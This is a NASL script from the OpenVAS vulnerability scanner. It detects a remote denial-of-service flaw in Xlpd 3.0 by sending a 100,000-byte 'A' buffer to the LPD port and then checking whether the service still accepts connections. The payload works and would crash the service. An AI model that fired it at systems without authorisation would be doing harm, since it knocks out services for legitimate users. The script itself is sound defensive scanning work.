###############################################################################
# OpenVAS Vulnerability Test
# $Id: Xlpd_36610.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Xlpd Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Xlpd is prone to a denial-of-service vulnerability because it fails to
adequately validate user-supplied input.

An attacker can exploit this issue to crash the affected application,
denying service to legitimate users. Given the nature of this issue,
the attacker may also be able to run arbitrary code, but this has not
been confirmed.

Xlpd 3.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100296");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-10-08 20:03:34 +0200 (Thu, 08 Oct 2009)");
 script_bugtraq_id(36610);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Xlpd Remote Denial of Service Vulnerability");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/lpd", 515);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/36610");
 script_xref(name : "URL" , value : "http://www.netsarang.com/products/xlp_detail.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/507029");
 exit(0);
}

include("misc_func.inc");

if(safe_checks())exit(0);

port = get_kb_item("Services/lpd");
if(!port)port="515";

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

req = crap(data:raw_string(0x41),length:100000);
send(socket:soc, data:req);
close(soc);

sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1) {
   security_message(port:port);
   exit(0);
}  else {
   close(soc1);
}  

exit(0);
